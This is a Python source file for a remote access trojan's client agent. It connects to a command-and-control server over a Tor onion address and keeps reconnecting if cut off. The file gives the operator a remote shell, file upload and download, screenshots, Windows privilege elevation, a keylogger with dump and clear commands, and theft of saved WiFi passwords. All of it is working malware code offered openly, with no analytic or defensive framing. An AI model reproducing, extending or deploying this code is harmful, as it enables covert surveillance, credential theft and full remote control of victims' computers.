# import cv2
import json
import os
import socket
import subprocess
import sys
import threading
from sys import platform
from shutil import copyfile
import requests
import time

# Local tools to the application
from tools import keylogger, privilege, chrome, peripherals, screenshot, wifi

#importing tor network
from tor_network import ClientSocket, Tor

#constraints
ENCODING = 'utf-8'
BUFFER_SIZE = 4096

# Global socket variable
s = None

def reliable_send(data):
    try:
        json_data = json.dumps(data)
        length = len(json_data)
        length_header = f"{length:<10}".encode()  # Fixed length header
        s.send(length_header)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")
        raise

def reliable_recv():
    try:
        # First receive the length header
        length_header = s.recv(10).decode().strip()
        if not length_header:
            return None
        
        # Convert length header to int
        length = int(length_header)
        
        # Receive the actual data
        chunks = []
        bytes_received = 0
        while bytes_received < length:
            chunk = s.recv(min(length - bytes_received, BUFFER_SIZE))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
        
        data = b''.join(chunks).decode()
        
        try:
            return json.loads(data)
        except json.JSONDecodeError:
            return data.strip()
            
    except Exception as e:
        print(f"Error receiving data: {e}")
        raise

def is_admin():
    try:
        if os.name == 'nt':  # Windows
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:  # Unix/Linux/Mac
            return os.getuid() == 0  # Root has UID 0
    except:
        return False

def elevate_privilege():
    if platform == 'win32':
        privilege.priv()
        return True
    else:
        print("Elevating privilege on Linux/Mac is not supported")
        return False
        

def handle_file_transfer(command_data):
    try:
        if command_data['command'] == 'upload':
            try:
                filename = command_data['filename']
                file_size = int(command_data['size'])  # Ensure size is an integer
                
                print(f"\n[*] Receiving file: {filename}")
                print(f"[*] File size: {file_size} bytes")
                
                # Send ready confirmation
                reliable_send({'ready': True})
                
                # Receive and save file
                received = 0
                with open(filename, 'wb') as f:
                    while received < file_size:
                        chunk = s.recv(min(4096, file_size - received))
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                        # Calculate and print progress
                        progress = (received / file_size) * 100
                        print(f"\r[*] Progress: {progress:.1f}% ({received}/{file_size} bytes)", end='')
                
                print()  # New line after progress
                
                if received == file_size:
                    print("[+] File received successfully")
                    reliable_send({'success': True})
                else:
                    print("\n[-] Upload incomplete")
                    reliable_send({'error': 'Upload incomplete'})
                    
            except (ValueError, TypeError) as e:
                print(f"[-] Invalid file size: {e}")
                reliable_send({'error': f'Invalid file size: {str(e)}'})
            except Exception as e:
                print(f"[-] Upload error: {e}")
                reliable_send({'error': str(e)})
                
        elif command_data['command'] == 'download':
            try:
                filename = command_data['filename']
                print(f"\n[*] Server requested download of: {filename}")
                
                try:
                    with open(filename, 'rb') as f:
                        file_data = f.read()
                        
                    file_size = len(file_data)
                    print(f"[*] File size: {file_size} bytes")
                    
                    # Send file size first
                    reliable_send({'size': file_size})
                    
                    # Send file data
                    sent = 0
                    chunk_size = 4096
                    while sent < file_size:
                        chunk = file_data[sent:sent + chunk_size]
                        s.sendall(chunk)
                        sent += len(chunk)
                        # Calculate and print progress
                        progress = (sent / file_size) * 100
                        print(f"\r[*] Progress: {progress:.1f}% ({sent}/{file_size} bytes)", end='')
                    
                    print("\n[+] File sent successfully")
                    
                except FileNotFoundError:
                    print(f"[-] File not found: {filename}")
                    reliable_send({'error': 'File not found'})
                except Exception as e:
                    print(f"[-] Error reading file: {e}")
                    reliable_send({'error': str(e)})
                    
            except Exception as e:
                print(f"[-] Download error: {e}")
                reliable_send({'error': str(e)})
                
    except Exception as e:
        print(f"[!] File transfer error: {e}")
        try:
            reliable_send({'error': str(e)})
        except:
            pass

def handle_screenshot():
    """Handle screenshot command
    Returns:
        dict: Response with success/error message
    """
    try:
        # Initialize screenshot module
        screen = screenshot.Screenshot()
        
        try:
            # Take screenshot
            success, message, image_data = screen.capture()
            
            if not success or not image_data:
                return {'error': message}
            
            # Send success response with file size
            reliable_send({
                'success': True,
                'message': message,
                'size': len(image_data)
            })
            
            # Send image data
            s.sendall(image_data)
            
            # Send final status
            reliable_send({
                'success': True,
                'message': 'Screenshot data sent successfully'
            })
            
            return {'success': True, 'message': message}
            
        finally:
            screen.cleanup()
            
    except Exception as e:
        error_msg = f"Screenshot error: {str(e)}"
        print(error_msg)
        return {'error': error_msg}

def shell():
    while True:
        try:
            command = reliable_recv()
            if not command:
                break
                
            if isinstance(command, dict):
                if command.get('command') in ['upload', 'download']:
                    handle_file_transfer(command)
                    continue
                
            if command == 'quit':
                print("[*] Terminating agent...")
                # Clean shutdown
                if s:
                    try:
                        reliable_send({'status': 'terminating'})
                        s.shutdown(socket.SHUT_RDWR)
                        s.close()
                    except:
                        pass
                return  # Exit the shell function
                
            elif command == 'sysinfo':
                print(f"[*] Executing: {command}")
                info = {
                    'os': platform,
                    'hostname': socket.gethostname(),
                    'username': os.getlogin(),
                    'is_admin': is_admin()
                }
                reliable_send(info)
            elif command.startswith('cd '):
                print(f"[*] Executing: {command}")
                try:
                    os.chdir(command[3:])
                    reliable_send({
                        'success': True,
                        'cwd': os.getcwd(),
                        'output': f"Changed directory to: {os.getcwd()}"
                    })
                except Exception as e:
                    reliable_send({'error': str(e)})
            elif command == 'screenshot':
                print("[*] Taking screenshot...")
                response = handle_screenshot()
                # reliable_send(response)
            
            elif command == 'privilege':
                print("[*] Elevating privilege...")
                response = elevate_privilege()
                reliable_send("Successfully elevated privilege")
            elif command.startswith('keylogger'):
                print(f"[*] Executing keylogger command: {command}")
                try:
                    cmd = command.split(' ')[1]
                    if not hasattr(shell, '_keylogger'):
                        shell._keylogger = None
                        shell._keylogger_thread = None
                    
                    if cmd == 'start':
                        if shell._keylogger is None:
                            shell._keylogger = keylogger.Keylogger()
                            shell._keylogger_thread = threading.Thread(target=shell._keylogger.start)
                            shell._keylogger_thread.daemon = True
                            shell._keylogger_thread.start()
                            reliable_send({'success': True, 'message': 'Keylogger started successfully'})
                        else:
                            reliable_send({'error': 'Keylogger is already running'})
                    
                    elif cmd == 'stop':
                        if shell._keylogger:
                            shell._keylogger.self_destruct()
                            shell._keylogger = None
                            shell._keylogger_thread = None
                            reliable_send({'success': True, 'message': 'Keylogger stopped successfully'})
                        else:
                            reliable_send({'error': 'No active keylogger session'})
                    
                    elif cmd == 'dump':
                        if shell._keylogger:
                            try:
                                logs = shell._keylogger.read_logs()
                                reliable_send({'success': True, 'output': logs})
                            except Exception as e:
                                reliable_send({'error': f'Failed to read logs: {str(e)}'})
                        else:
                            reliable_send({'error': 'No active keylogger session'})
                    
                    elif cmd == 'clear':
                        if shell._keylogger:
                            try:
                                shell._keylogger.overwrite_file()
                                reliable_send({'success': True, 'message': 'Logs cleared successfully'})
                            except Exception as e:
                                reliable_send({'error': f'Failed to clear logs: {str(e)}'})
                        else:
                            reliable_send({'error': 'No active keylogger session'})
                    else:
                        reliable_send({'error': f'Unknown keylogger command: {cmd}'})
                except Exception as e:
                    reliable_send({'error': f'Keylogger error: {str(e)}'})
            elif command == 'wifi_dump':
                print("[*] Dumping WiFi passwords...")
                try:
                    dumper = wifi.WifiDumper()
                    success, message = dumper.get_wifi_profiles()
                    if success:
                        # Save to file and get JSON data
                        save_success, save_message = dumper.save_to_file()
                        wifi_data = dumper.get_json()
                        reliable_send({
                            'success': True,
                            'message': save_message,
                            'wifi_data': wifi_data
                        })
                    else:
                        reliable_send({'error': message})
                except Exception as e:
                    reliable_send({'error': f'WiFi dump error: {str(e)}'})
            else:
                print(f"[*] Executing: {command}")
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send({
                    'output': result.decode(),
                    'cwd': os.getcwd()
                })
                
        except Exception as e:
            print(f"[!] Error executing command: {e}")
            reliable_send({'error': str(e)})
            continue

def connect():
    global s
    while True:
        try:
            # Create new socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # Set timeout for connection attempts
            
            # Get connection details from Tor
            tor = Tor()
            onion, port = tor.read_address_from_binary()
            print(f'Connecting to: {onion}:{port}')
            
            # Create Tor connection
            clientsock = ClientSocket(onion, port)
            s = clientsock.create_connection()
            
            print("Connected to C2 server")
            shell()
            
            # If shell() returns normally (due to quit command), break the loop
            print("[*] Agent terminated by server")
            break
            
        except Exception as e:
            print(f"Connection error: {e}")
            if s:
                try:
                    s.close()
                except:
                    pass
            time.sleep(5)  # Wait before retrying
            continue

if __name__ == "__main__":
    while True:
        try:
            connect()
        except KeyboardInterrupt:
            print("\nExiting...")
            if s:
                s.close()
            sys.exit(0)
        except Exception as e:
            print(f"Fatal error: {e}")
            time.sleep(10)  # Wait before restarting